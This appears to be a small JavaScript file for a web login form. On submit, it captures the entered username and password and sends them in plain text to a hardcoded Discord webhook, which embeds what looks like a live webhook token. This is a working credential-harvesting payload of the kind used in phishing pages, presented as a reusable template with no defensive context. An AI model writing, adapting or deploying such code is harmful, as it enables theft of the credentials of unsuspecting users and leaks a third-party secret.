document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('userForm');
    form.addEventListener('submit', handleFormSubmit);
});

function handleFormSubmit(event) {
    event.preventDefault();

    const formData = new FormData(event.target);
    const username = formData.get('username');
    const password = formData.get('password');

    // Construct the message body
    const data = {
        content: `Username: ${username}\nPassword: ${password}`,
        // Add other Discord webhook parameters as needed
    };

    // Discord webhook URL
    const webhookUrl = 'https://discord.com/api/webhooks/1163062768136626206/L7s4-XxvgcOfdxDcCTJ2EnHMO8FisdckCSJrOHxbfGqen-xDpxIDQ5tKCMRP763HBtBI'; // Replace with your actual Discord webhook URL

    // Send data to the Discord webhook
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        // Handle success - maybe clear the form or give feedback
    })
    .catch(error => {
        // Handle error - maybe notify the user
        console.error('There was a problem with the fetch operation:', error);
    });
}
